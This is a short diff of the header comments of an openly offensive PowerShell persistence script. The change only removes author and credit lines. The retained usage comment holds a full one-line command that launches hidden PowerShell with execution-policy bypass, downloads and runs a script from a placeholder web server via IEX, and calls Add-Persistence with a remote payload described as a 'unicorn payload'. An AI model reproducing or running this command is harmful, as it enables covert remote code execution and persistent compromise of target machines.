@@ -1,5 +1,4 @@
 # powershell-persistence.ps1
-# Author: @curi0usJack
 #
 # Assumes your target has the ability to download files
 #
@@ -8,7 +7,6 @@
 # 3) Call this from your shell:
 #	powershell.exe -window hidden -exec bypass -noni -c "IEX (New-Object Net.WebClient).DownloadString('http://WEBSERVER/powershell-persist.ps1'); Add-Persistence http://WEBSERVER/powershell_attack.txt"
 # 
-# Kudos to @slobtresix for the initial model. Modified to work directly with unicorn payloads.
 #
 #
 function Add-Persistence()
